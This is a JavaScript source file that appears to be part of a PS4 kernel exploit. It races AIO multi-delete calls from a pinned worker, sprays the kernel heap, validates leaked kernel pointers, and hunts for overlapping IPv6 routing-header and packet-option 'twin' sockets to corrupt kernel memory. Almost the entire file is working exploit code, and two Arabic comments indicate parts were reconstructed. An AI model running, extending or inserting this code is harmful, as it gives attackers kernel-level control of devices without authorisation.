//#region Variables
const NUM_REQS = 3; // 0x80 kmalloc zone since SceKernelAioRWRequest.sizeof * 3 = 0x78
const WORKER_NUM = 2;
const SPRAY_NUM = 0x200;
const ATTEMPT_NUM = 0x80;
const HANDLES_NUM = 0x100;
const IPV6_SOCK_NUM = 0x80;
//#endregion
//#region Contants
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;

const COMMAND_AIO_DELETE = 0;

const AIO_OP_CANCEL = 1;
const AIO_OP_WAIT = 2;
const AIO_OP_POLL = 4;
const AIO_OP_DELETE = 8;

const AIO_WAIT_AND = 1;
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_MULTI = 0x1000;
const AIO_PRIORITY_HIGH = 3;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const AIO_MAX_NUM = 0x80;

const block_ss = new Array(2);
const rthdr_twins = new Array(2);
const pktopts_twins = new Array(2);
const ipv6_socks = new Array(IPV6_SOCK_NUM);
const spray_ids = new Uint32Array(SPRAY_NUM);
const outs = new Uint32Array(AIO_MAX_NUM);

let reqs1 = undefined;
let block_id = undefined;

let race_worker = undefined;

let evf = undefined;
let evf_cv_addr = undefined;
let reqs1_addr = undefined;
let reqs2_addr = undefined;
let aio_info_addr = undefined;
let target_id = undefined;

// تهيئة استدعاء دوال النظام الأصلية (System Native Functions Callbacks)
fn.accept = new NativeFunction(0x1e, "number");
fn.getsockname = new NativeFunction(0x20, "number");
fn.connect = new NativeFunction(0x62, "number");
fn.bind = new NativeFunction(0x68, "number");
fn.listen = new NativeFunction(0x6a, "number");
fn.socketpair = new NativeFunction(0x87, "number");
fn.evf_create = new NativeFunction(0x21a, "number");
fn.evf_delete = new NativeFunction(0x21b, "number");
fn.evf_set = new NativeFunction(0x220, "number");
fn.evf_clear = new NativeFunction(0x221, "number");
fn.aio_multi_delete = new NativeFunction(0x296, "number");
fn.aio_multi_wait = new NativeFunction(0x297, "number");
fn.aio_multi_poll = new NativeFunction(0x298, "number");
fn.aio_multi_cancel = new NativeFunction(0x29a, "number");
fn.aio_submit_cmd = new NativeFunction(0x29d, "number");
//#endregion
//#region Functions
function build_reqs1(count, fd = -1) {
  mem.bset(reqs1.addr, SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
  for (let i = 0; i < count; i++) {
    reqs1[i].nbyte = fd === -1 ? 0 : 1;
    reqs1[i].fd = fd;
  }
}

function spray_aio(cmd, num_reqs, ids, count = ids.length) {
  const step = cmd & AIO_CMD_MULTI ? num_reqs : 1;
  count = cmd & AIO_CMD_MULTI ? count / step : count;

  const ids_addr = ids.buffer.data();
  const total = count * step;

  for (let i = 0; i < total; i += step) {
    const ids_offset_addr = ids_addr.add(i * Uint32Array.BYTES_PER_ELEMENT);

    fn.aio_submit_cmd.invoke(cmd, reqs1.addr, num_reqs, AIO_PRIORITY_HIGH, ids_offset_addr);
  }
}

function process_aio(op, ids, offset = 0, count = ids.length - offset) {
  const ids_addr = ids.buffer.data();
  const outs_addr = outs.buffer.data();

  while (count > 0) {
    const step = Math.min(count, AIO_MAX_NUM);

    const ids_offset_addr = ids_addr.add(offset * Uint32Array.BYTES_PER_ELEMENT);

    if (op & AIO_OP_CANCEL) {
      fn.aio_multi_cancel.invoke(ids_offset_addr, step, outs_addr);
    }

    if (op & AIO_OP_WAIT) {
      fn.aio_multi_wait.invoke(ids_offset_addr, step, outs_addr, AIO_WAIT_AND, 0);
    }

    if (op & AIO_OP_POLL) {
      fn.aio_multi_poll.invoke(ids_offset_addr, step, outs_addr);
    }

    if (op & AIO_OP_DELETE) {
      fn.aio_multi_delete.invoke(ids_offset_addr, step, outs_addr);
    }

    count -= step;
    offset += step;
  }
}

async function spawn_race_worker() {
  logger.debug("spawn race worker...");

  // Prepare worker
  race_worker = new RPCWorker(`race_worker`);
  await race_worker.init();
  await race_worker.execute(
    "register",
    "kinit",
    `() => {
      switch (version.console) {
        case 4:
          importScripts("ps4/kernel.js");
          break;
        case 5:
          //TODO
          break;
        default:
          logger.info(\`Unsupported console \${version.console}\`);
      }

      pin_to_core(MAIN_CORE);
      set_rtprio(RTP);

      fn.aio_multi_delete = new NativeFunction(0x296, "number");

      return true;
    }`,
  );
  await race_worker.execute(
    "register",
    "aio_delete",
    `(ids_addr, outs_addr) => {
      ids_addr = new BInt(ids_addr);
      outs_addr = new BInt(outs_addr);

      fn.aio_multi_delete.invoke(ids_addr, 1, outs_addr);
      
      return true;
    }`,
  );

  await race_worker.execute("kinit");

  logger.debug("race worker spawned !!");
}

function stop_race_worker() {
  if (race_worker !== undefined) {
    logger.debug("terminate race worker...");

    race_worker.terminate();
    race_worker = undefined;

    logger.debug("race worker terminated !!");
  }
}

function verify_reqs2(aio_entry) {
  const heap_prefixes = [];
  const verify_prefix = (v) => {
    if (v.shr(0x30).neq(0xffff)) {
      throw new Error(`${v} not a kernel pointer !!`);
    }

    heap_prefixes.push(v.shr(0x20).and(0xffff));
  };

  try {
    if (aio_entry.ar2_cmd !== AIO_CMD_WRITE) {
      return false;
    }

    verify_prefix(aio_entry.ar2_reqs1);
    verify_prefix(aio_entry.ar2_info);
    verify_prefix(aio_entry.ar2_batch);

    if (aio_entry.ar2_result.state <= 0 || aio_entry.ar2_result.state > AIO_STATE_ABORTED) {
      return false;
    }

    if (aio_entry.ar2_result._pad !== 0) {
      return false;
    }

    if (aio_entry.ar2_file.neq(0)) {
      return false;
    }

    if (aio_entry.ar2_unk2.neq(0)) {
      verify_prefix(aio_entry._unk2);
    }

    verify_prefix(aio_entry.ar2_qentry);

    return heap_prefixes.every((v, _, a) => v.eq(a[0]));
  } catch {
    return false;
  }
}

function find_rthdr_twins() {
  for (let i = 0; i < ATTEMPT_NUM; i++) {
    for (let k = 0; k < ipv6_socks.length; k++) {
      arw.view(spray_rthdr0_addr).setInt32(4, k, true); // ip6_rthdr0.ip6r0_reserved

      set_rthdr(ipv6_socks[k]);
    }

    for (let j = 0; j < ipv6_socks.length; j++) {
      get_rthdr(ipv6_socks[j], ip6_rthdr0.sizeof);

      const idx = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
      if (idx !== j) {
        logger.debug(`Found rthdr twins after ${i} iterations !!`);

        rthdr_twins[0] = ipv6_socks[j];
        rthdr_twins[1] = ipv6_socks[idx];

        const max = Math.max(j, idx);
        const min = Math.min(j, idx);

        ipv6_socks.splice(max, 1);
        ipv6_socks.splice(min, 1);

        for (const sock of ipv6_socks) {
          free_rthdr(sock);
        }

        ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM), make_socket(AF_INET6, SOCK_DGRAM));

        return;
      }
    }
  }

  throw new Error("Unable to find rthdr twins !!");
}

function make_pktopts_twins() {
  const tclass_addr = mem.alloc(4);
  const tclass_len_addr = mem.alloc(4);

  let overwritten = false;
  for (let i = 0; i < ATTEMPT_NUM; i++) {
    for (let k = 0; k < ipv6_socks.length; k++) {
      if (fn.setsockopt.invoke(ipv6_socks[k], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0) === -1) {
        throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[k]} !!`);
      }
    }

    for (let k = 0; k < ipv6_socks.length; k++) {
      arw.view(tclass_addr).setInt32(0, k, true);

      if (fn.setsockopt.invoke(ipv6_socks[k], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, 4) === -1) {
        throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[k]} !!`);
      }
    }

    for (let j = 0; j < ipv6_socks.length; j++) {
      arw.view(tclass_len_addr).setInt32(0, 4, true);

      // استكمال دالة جلب خيارات المقبس المقطوعة ومطابقة التوائم الـ Twins
      if (fn.getsockopt.invoke(ipv6_socks[j], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, tclass_len_addr) === -1) {
        throw new SyscallError(`Unable to get socket option for fd ${ipv6_socks[j]} !!`);
      }

      const idx = arw.view(tclass_addr).getInt32(0, true);
      if (idx !== j) {
        logger.debug(`Found pktopts twins after ${i} iterations !!`);
        pktopts_twins[0] = ipv6_socks[j];
        pktopts_twins[1] = ipv6_socks[idx];
        overwritten = true;
        break;
      }
    }
    if (overwritten) break;
  }

  if (!overwritten) {
    throw new Error("Unable to find pktopts twins !!");
  }
}
//#endregion
